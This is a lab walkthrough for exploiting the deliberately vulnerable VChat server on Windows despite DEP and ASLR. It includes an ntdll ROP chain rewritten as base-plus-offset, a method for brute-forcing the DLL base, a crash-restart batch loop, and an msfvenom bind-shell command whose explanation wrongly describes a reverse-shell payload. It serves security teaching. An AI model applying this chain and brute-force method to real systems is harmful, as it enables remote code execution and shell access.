# Bypassing Window Exploit Protection
*Notice*: This is not based on an existing blog, the original implementation is from [llan-OuO](https://github.com/llan-OuO).
___
Due to the prevalence of protections such as [Address Space Layout Randomization](https://learn.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10#address-space-layout-randomization) (ASLR) and NonExecutable Memory Segments through the use of [Data Execution Prevention](https://support.microsoft.com/en-us/topic/what-is-data-execution-prevention-dep-60dabc2b-90db-45fc-9b18-512419135817) (DEP) in Windows. This exploit will use the ROP technique discussed [previously](https://github.com/DaintyJet/VChat_TRUN_ROP) with some modifications and assumptions to bypass both ASLR, and DEP protections. 


<!-- * Examples of malware that has bypassed protections.
> Need a better understanding before more note structure can be given -->

**Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
## Windows Protections
In order to exploit VChat with the protections enabled we will need to understand what those protections are doing to prevent attackers from successfully exploiting the system. Otherwise we are unable to create effective measures to bypass them. 

### Data Execution Prevention 
This protection has been discussed in detail [previously](https://github.com/DaintyJet/VChat_DEP), for more detail please refer to the previous writeup and [official documentation](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention) as this will only cover the basics. 

DEP is a system level protection that is enabled on a per-executable basis at [compile time](https://learn.microsoft.com/en-us/cpp/build/reference/nxcompat-compatible-with-data-execution-prevention?view=msvc-170) or by enabling a bit in the Portable Executable (PE) File using [EditBin](https://learn.microsoft.com/en-us/cpp/build/reference/editbin-options?view=msvc-170). This can also be enabled for all processes on a system wide basis through the [command line](https://learn.microsoft.com/en-us/cpp/build/reference/editbin-options?view=msvc-170) or through the [Advanced Systems Properties GUI](https://thegeekpage.com/how-to-enable-or-disable-data-execution-prevention-dep-on-windows-10-11/).   

Once enabled the host system will check the NoneXecutable (NX) bit on each page of memory when attempting to process executable instructions. If this bit is set on the page of memory the current instruction comes from, then an exception will be raised, as we should not be executing any instructions in regions where the NX bit is set. Because the stack region will have the NX bit set this prevents attackers from directly writing shellcode onto the stack, and using a `JMP ESP` instruction to gain control of the execution's flow.

### Address Space Layout Randomization
[ASLR](https://learn.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10#address-space-layout-randomization) is a system-level protection that increases the difficulty attackers will face when attempting to locate, overwrite or jump to specific locations in the memory. This is enabled by default for the core Windows dlls and executables; It can be enabled at [compile time](https://learn.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170) or with [Editbin](https://learn.microsoft.com/en-us/cpp/build/reference/editbin-options?view=msvc-170) for user applications or dlls. 

In comparison to how ASLR is implemented in Linux, Windows suffers from some issues which make it more susceptible to attacks which bypass ASLR. For our exploit, the primary issue with the Windows ASLR implementation is that the library we randomize the address for, is only assigned a new address when it is loaded into memory. This only occurs when a process loads it for the first time, often at the time our system boots up; or when all process using the library have exited and the library is unloaded. Then since the library will need to be reloaded into memory it will have it's base address randomized again. For most dlls, they are used by many processes in the user space, so it is unlikely they will be unloaded from memory so the only way to grantee we get new randomized base addresses is for the system to restart \[1\]. Additionally 32-bit EXEs like VChat contain only 8-bits that can be randomized without compromising the functionality of the executable \[1\] and 32bit DLLs only contain 14-bits capable of randomization \[2\]. This means as long as the program we are exploiting, in this case VChat is restarted shortly after it crashes it is unlikely that the base address of the dlls or modules we wish to use change; this allows us to brute force the base address of a module within our lifetime. Another issue with the implementation of Window's ASLR is that the shared DLLs are loaded at the same address for all process on the system, this means if were were able to discover the base address by exploiting a separate *accessible* process "A" then we could use the address acquired from process "A" in an exploit against our intended target process "B" on the same system without having to brute force the address, or gain access to B's binary.


## Prerequisites
This project requires some basic knowledge of *These modules are a WIP* [Windows Exploit Protection](https://github.com/llanShiraishi/WinExploit), ASLR, and ROP Chains. We have discussed the generation of ROP chains against the VChat program in [previous documents](https://github.com/DaintyJet/VChat_TRUN_ROP). This exploit is based off the [VChat_TRUN_ROP](https://github.com/DaintyJet/VChat_TRUN_ROP) exploit, however this exploit will use limited knowledge of the system to brute force the base address of a Windows DLL used in the generation of a ROP chain. We will bypass both the ASLR and DEP protections that have been discussed previously.  

## Exploit Process
The following sections cover the process that should (Or may) be followed when preforming this exploitation on the VChat application. It should be noted, that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumption primarily that we have access to the binary that may not be realistic in cases where you exploit remote servers, and that the target process with restart an unlimited amount of times when it crashes or otherwise exits; however the enumeration and exploitation of generic Windows, and Linux servers to get the binary from a remote server falls outside of the scope of this document.

**Note**: You will *need* to recompile VChat for this exploit to work as expected. This is done to eliminate a null byte from the base address of the executable.
### Pre-Exploitation
1. **Windows**: Setup Vchat
   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw 
      1. Create the essfunc object File 
		```powershell
		# Compile Essfunc Object file 
		$ gcc.exe -c essfunc.c
		```
      2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
		```powershell
		# Create a the DLL with a static (preferred) base address of 0x62500000
		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
		```
         * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
         * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
         * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
         * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
      3. Compile the VChat application 
		```powershell
		# Compile and Link VChat
		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a -Wl,--image-base=0x62400000
		```
         * ```vchat.c```: The source file is "vchat.c"
         * ```-o vchat.exe```: The output file will be the executable "vchat.exe"
         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll"
         * ```./-Wl,--image-base=0x62400000```: Specify a Windows Linker option and configure the base address to be  
   2. Launch the VChat application 
		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll
2. **Linux**: Run NMap
	```sh
	# Replace the <IP> with the IP of the machine.
	$ nmap -A <IP>
	```
   * We can think of the "-A" flag like the term aggressive as it does more than the normal scans, and is often easily detected.
   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minuets depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
   * Example results are shown below:

		![Alt text](Images/Nmap.png)

3. **Linux**: As we can see the port ```9999``` is open, we can try accessing it using **Telnet** to send unencrypted communications
	```
	$ telnet <VChat-IP> <Port>

	# Example
	# telnet 127.0.0.1 9999
	```
   * Once you have connected, try running the ```HELP``` command, this will give us some information regarding the available commands the server processes and the arguments they take. This provides us a starting point for our [*fuzzing*](https://owasp.org/www-community/Fuzzing) work.
   * Exit with ```CTL+]```
   * An example is shown below

		![Alt text](Images/Telnet.png)

4. **Linux**: We can try a few inputs to the *TRUN* command, and see if we can get any information. Simply type *TRUN* followed by some additional input as shown below

	![Telnet](Images/Telnet2.png)

	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.

### Influences of Enabling Windows Exploit Protection
Before enabling Windows Exploit Protection, the base addresses of vulnserver.exe and essfunc.dll are fixed at 0x00400000 and 0x62500000 respectively. This is because both are not ASLR-compatible as they are not linked with the /DYNAMICBASE flag at compile time. Other modules in the Windows system are ASLR-compatible, hence, their base addresses will change if the machine restarts as discussed [previously](#address-space-layout-randomization).

1. We can first look at the base addresses of the modules VChat loads: In Immunity debugger access the Executable modules table by accessing the following tabs (View -> Executable modules or <Alt+E>) This is shown below.

   1. Access the *View* Tab, and click on *Executable*.
        
        <img src="Images/I1.png" width=600>

    1. Examine the Base addresses of each module. 
        
        <img src="Images/I2.png" width=600>

2. Enable *all* Windows Exploit Protections, additional methods for enabling DEP have been discussed in [previous walkthroughs](https://github.com/DaintyJet/VChat_DEP). 
   1. Open Windows Settings
        
        <img src="Images/I3.png" width=600>
   
   2. Search Exploit Protection in Windows start menu.

        <img src="Images/I4.png" width=600>

   3. Turn on all defenses and restart the machine. (You should at a minimum turn on the DEP and ASLR protections)

        <img src="Images/I5.png" width=600>
    

<!-- 
https://stackoverflow.com/questions/6002359/so-most-of-the-binary-is-composed-of-reloc-table 
https://www.codeproject.com/Articles/12532/Inject-your-code-to-a-Portable-Executable-file#ImplementRelocationTable7_2
-->
3. Now that we have enabled the Windows Exploit Protections, forced ASLR will take effect and the base addresses of all DLLs (including essfunc.dll) will be randomized each time the victim machine restarts. Vulnserver.exe would not be randomized because it does not contain a [.reloc section](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only) which is required for the host system to successfully rebase the module. The `.reloc` section contains the information required by the dynamic linker in order to factor in the difference between the expected and actual location in memory of pointers and functions within the module that have had their absolute addresses changed due to the relocation. This table allows us to refer to the addresses within a relocated file as a constant offset from some base address. 

    1. Lets look at the Memory view of the loaded process to confirm this: In Immunity debugger access the Memory View table by accessing the following tabs (Immunity debugger: View -> Memory <Alt+M>)

        <img src="Images/I6.png" width=600>

    2. Examine the PE file sections for VChat and Essfun.dll. Below is the memory view, we can see the `.realloc` section for the essefunc.dll 

        <img src="Images/I7.png" width=600>


## Exploitation


This writup will use the same attack that was done in [VChat_TRUN_ROP](https://github.com/DaintyJet/VChat_TRUN_ROP) with some modifications to launch a shell. The basic idea of the previous ROP attack is that a ROP chain for disabling DEP  is generated and executed so that we can then run our injected shell code directly from the stack.

However in this scenario, since the addresses of DLLs will change on system-restarts then we cannot predict the addresses of some instructions that we used in the ROP chian if we are on a remote machine. We also assume there is no access to the system for generating new ROP chains with [`mona`](https://www.bing.com/search?pglt=41&q=mona.py+manual&cvid=7e32adfb344d42948c54946510c5ecea&gs_lcrp=EgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7MgYIARBFGDkyBggCEC4YQDIGCAMQLhhAMgYIBBAuGEAyBggFEAAYQDIGCAYQABhAMgYIBxBFGDwyBggIEEUYPNIBCDMyNjJqMGoxqAIAsAIA&FORM=ANNTA1&PC=DCTS) each time as was done previously.  

To bypass ASLR, we will generate a ROP chain using only one ASLR-compatible module, and then we will brute force the base address of the target module. For this to work we assume the target application restarts shortly after a fatal error occurs. 

### Generate ROP chain

*Note:* Before running the ROP generation commands you can change `mona.py`'s working folder to make the results easier to find using the command `!mona config -set workingfolder c:\logs\E11` where `c:\logs\E11` is a path to the folder we want to save the results in.

1. In Immunity Debugger we can try generating a ROP chain with a single module. 
    
	https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/0592e77f-e7ea-4d89-bf7e-f0ebb6cdb870

    1. This can be done by using the following command, replace vchat.exe with a few other dlls:
        ```sh
        !mona rop -m vchat.exe -n
        ```
        * `-m `: Search through the specified files (In this case only vchat.exe) *only* when building ROP chains
        * `-n`: Ignore all modules that start with a Null Byte.

    2. Below we show the output of searching for gadgets in *vchat.exe* if you have **not recompiled** it to remove the null byte from it's address.

        <img src="Images/I8.png" width=600>

    3. If you have then we will see `mona.py` has found some useful gadgets, but it has not found enough to create a full ROP chain to call VirtualProtect.

        <img src="Images/I9.png" width=600>

    4. By looking at the `rop_chains.txt` we can see this more clearly.

        <img src="Images/I10.png" width=600>

        * You can see the lack of certain gadgets due to the comments `0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx` 
2. To extend the gadget space we can add an additional module, which will hopefully contain the gadgets we need. As we have enabled ASLR system-wide, any dll we add will be rebased and we will be required to brute force it's base address. In this way we want to include only one additional DLL.
   1. Detemine some DLLs that we could use that are loaded by the VChat process. There are two common methods to do this.
      1. In Immunity Debugger 

	https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/ad786202-099d-4dc7-bdda-f7e9ef1d5b3a

         1.  Access the Executable Modules table, Click on the View Tab -> Executable Module

            <img src="Images/I11.png" width=600>

        1. Examine the DLLs Loaded by the process

            <img src="Images/I12.png" width=600>

            * Immunity debugger organizes the DLLs under the executable modules table as they a *shared libraries* that contain executable code that the main process will call! 
      1. Using the Windows Sysinternals tool [ListDLLs](https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls). If you plan to use this method you should download this and add it to your path or simply execute the commands from the folder the executable is located in.
        
	https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/16fa708d-cf57-4d0f-90fa-eef338818386

        1. Open Task Manager, and locate the VChat Process.

            <img src="Images/I13.png" width=600>

            * If you do not have the additional details displayed, you should click the *More Details* button at the bottom of the Task Manager window.
        2. Right Click the process and select *Go to Details*

            <img src="Images/I14.png" width=600>

        3. Now we know the Process ID (PID) of our VChat Process. This will be used in the `ListDLLs` command!

            <img src="Images/I15.png" width=600>

        4. Use the following command in a *command prompt* to list the DLLs loaded for a given process with the PID we have specified.

            ```
            $ .\Listdlls64.exe -r -v <PID>
            ```
            * `.\Listdlls64.exe`: We ran the ListDLLs command without adding it to the `PATH`, hence it includes the `.\`.
            * `-r`: This flag tells ListDLLs to flag any DLLs that have been relocated since they could not be loaded at their preferred address. 
            * `-v`: This flag tells ListDLLs to display all version information for each DLL it locates
3. Attempt to Generate a few ROP chains using various DLLs in addition to the VChat executable.
    ```
    !mona rop -m vchat.exe,<filename> -n

    # e.g. !mona rop -m vchat.exe,ntdll.dll -n
    ```
    * It may take a few tries to get a working chain. 

    We selected the combination of vulnserver.exe and ntdll.dll and got the following ROP chain 
    ```
        #[---INFO:gadgets_to_set_esi:---]
        0x771e7a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x7716c7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x7713e866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x77177cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x7718b903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        0x771e28aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
        0x77142002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x771d3ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (compensate)
        #[---INFO:gadgets_to_set_edx:---]
        0x77170173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
        0x77142002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x7711b6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x771d74b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x77225c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x7717a182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x77136205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x772118d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x771194f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ```
4. Now we can locate the *base* address of the dll we used as part of this ROP chain, there are two methods for doing this when the DLL has been loaded by the VChat process.

    1. Immunity Debugger 
       1. Open the Memory View window (View -> Memory)

            <img src="Images/I16.png" width=600>

        2. Scroll till you find the DLL we used in the ROP chain generation, we will be looking for the base address of the DLL as we will be able to offset into the `.text` segment where the code associated with the DLL is located.

            <img src="Images/I17.png" width=600>

    2. Using [ListDLLs](https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls) we can find the base address of the DLL. 
       1. Open Task Manager, and locate the VChat Process.

            <img src="Images/I13.png" width=600>

            * If you do not have the additional details displayed, you should click the *More Details* button at the bottom of the Task Manager window.
        2. Right Click the process and select *Go to Details*

            <img src="Images/I14.png" width=600>

        3. Now we know the Process ID (PID) of our VChat Process. This will be used in the `ListDLLs` command!

            <img src="Images/I15.png" width=600>

        4. Use the following command in a *command prompt* to list the DLLs loaded for a given process with the PID we have specified.

            ```
            $ .\Listdlls64.exe -r -v <PID>
            ```
            * `.\Listdlls64.exe`: We ran the ListDLLs command without adding it to the `PATH`, hence it includes the `.\`.
            * `-r`: This flag tells ListDLLs to flag any DLLs that have been relocated since they could not be loaded at their preferred address. 
            * `-v`: This flag tells ListDLLs to display all version information for each DLL it locates
        5. Locate the DLL we used, the base address will be included, we can use the direct base address or we can modify it so we offset based on the  `.text` segment as that will be `0x1000` after the base address (Though you would need to modify the code to take this into account as it only varies the high bits).  

            <img src="Images/I18.png" width=600>


### Rewriting the ROP chain
Since we will search the base of ntdll.dll, we need to rewrite the addresses of instructions in the ROP chain that refer to the ntdll.dll in the format of **base + offset**. Here, base is a variable and offset is a constant because this will not change unless the machine restarts. Offset for each instruction can be calculated following this formula: *offset = instruction address - base*.

> Don't update the Windows 10 virtual machine between generation and use, otherwise the ROP chain generated might be different. [How to Turn Off Automatic Updates on Windows 10](https://www.cleverfiles.com/howto/disable-update-windows-10.html)

Finally, we get a ROP chain like this once we have rewritten this offset:
```
base = 0x77100000   # base of ntdll.dll on your victim machine

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        base + 0xe7a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        base + 0x6c7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x3e866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebx:---]
        base + 0xe28aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0xd3ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (compensate)
        #[---INFO:gadgets_to_set_edx:---]
        base + 0x70173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x1b6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        base + 0xd74b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x125c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        base + 0x7a182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x36205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebp:---]
        base + 0x77cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x8b903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        base + 0x1118d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        base + 0x194f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
```

This ROP chain is the basis for the later brute forcing of the gadget locations. This is because, even when ASLR is enabled, the offset of the code within the DLL remains the same no matter where in memory the DLL is loaded. So by varying the base address assuming you have correctly calculated the offset, we will eventually get the correct base address leading to a successful execution of the ROP chain to call into `VirtualProtect(...)`. This is *not verifying* that the chain successfully sets the registers, only that we have the correct offsets. 

We can verify this ROP chain and our gadget offsets by modifying our exploit code to reflect [exploit0.py](SourceCode/exploit0.py) and running it against VChat. *Remember* to modify the ROP chain and base address!

1. Click on the black button highlighted below, enter in the address we decided in the previous step

    <img src="Images/I19.png" width=600>

2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250129D`, the address of our `RETN` instruction

    <img src="Images/I20.png" width=600>

3. Attack VChat using the [exploit0](./SourceCode/exploit0.py) program and step through the ROP chain to ensure that it has been constructed properly.

	https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/001e199c-0874-4224-8eee-dea220ce3160

### Automatically Restart vulnserver.exe when it crashes
While brute forcing the base address, some bad addresses will crash the target VChat. We need to write a simple batch (bat) file for VChat to restart automatically, this will simplify the exploitation process.  

Crate and run the [restart.bat](./SourceCode/restart.bat) batch file. The batch file and VChat.exe need to be in the same directory for this to work.
 ```
 @echo off
:start
start /w "" "vulnserver.exe"
goto start
 ```

### Create and run the attack script
Now we can modify the exploit program to brute force the base address of the target DLL.


1. Generate shellcode using [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) and so it can be added to our shellcode. 

	```sh
	$ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
	```
      * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
	  * `-p `: Payload we are generating shellcode for.
    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
    	* `EXITFUNC=thread`: Create a thread to run the payload.
	  * `-f`: The output format. 
      	* `python`: Format for use in python scripts.
  	  * `-v`: Specify a custom variable name.
      	* `SHELL`: Shell Variable name.
  	  * `-a x86`: Specify the target architecture as `x86`
	  * `--platform windows`: Specify the target platform as Windows
      * `-b`: Specifies bad chars and byte values. This is given in the byte values. 
        * `\x00\x0a\x0d`: Null char, carriage return, and newline. 

2. Modify your exploit code to reflect [exploit1a.py](SourceCode/exploit1a.py), this is so we can ensure the ROP chain will properly disable the DEP protections, and jump to the shellcode. Then run the exploit and observe the results. *Remember* to modify the ROP chain and base address!

   1. Click on the black button highlighted below, enter in the address we decided in the previous step

        <img src="Images/I19.png" width=600>

   2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250129D`, the address of our `RETN` instruction

       <img src="Images/I20.png" width=600>

    3. Now we step through until we have passed through the ```VirtualProtect(...)``` function and can see the shellcode, depending on the construction of the ROP chain it may not work as is shown below.

        https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/eed5beff-3e67-4762-9da8-8656aa09b52d

        * Notice that in my case the process crashed! In this case the instructions to set the `EBP` register.

            <img src="Images/I21.png" width=600>

    4. If the system crashes you will need to modify the exploit, or generate an alternative ROP chain that does not contain collisions! The solution could be as simple as changing the order the gadgets are executed in, or you may need to find alternative gadgets.   

	https://github.com/DaintyJet/VChat_Brute_Force/assets/60448620/f7da333e-cc33-4248-8ffc-f7c39d000582

        * In this case the EBP register is set with a simple `POP` instruction, so I was able to move the instruction used to set the `EBP` register to the end of the ROP chain. You can see this in the example [exploit1b.py](./SourceCode/exploit1b.py) code.   
            ```
            #[---INFO:gadgets_to_set_ebp:---]
            base + 0x76cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
            base + 0x8a903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
            ```
3. Now that we have a working ROP chain and know that the offsets are correct, we can generate the final program to brute force the ROP chain. We do this by modifying our exploit program to reflect [exploit2.py](./SourceCode/exploit2.py) we use a loop to iterate over a reasonable address space, and based on a query to the webserver determine if the attack was successful.

    
    <img src="Images/I22.png" width=600>

   * Sometimes you may get a false positive at a specific address, it is best to increase the starting (lower) address to bypass this in the event this happens.



A Telnet session will be created automatically by the python script once the correct base address is hit (If there is not false positive).

[![Video of running attack script](/images/bruteforce.png)](https://www.youtube.com/watch?v=8WSIHlDKPFE)



*Note*: In the test case, we ran into 3 faulse positives which required us to adjust the lower_bound starting point.
## Code 

1. [exploit0.py](./SourceCode/exploit0.py): This exploit is used to verify that the original rop chain contains usable gadgets 
2. [exploit1a.py](./SourceCode/exploit1a.py): This exploit is used to verify that we have correctly generated offsets
3. [exploit1b.py](./SourceCode/exploit1b.py): This exploit is used to show that we may have to modify the ROP chain in order to avoid collisions.
4. [exploit2.py](./SourceCode/exploit2.py): This exploit is used to brute force the address space and execute the payload. 

## References

[1] https://www.mandiant.com/resources/blog/six-facts-about-address-space-layout-randomization-on-windows
[2] https://msrc.microsoft.com/blog/2013/12/software-defense-mitigating-common-exploitation-techniques/
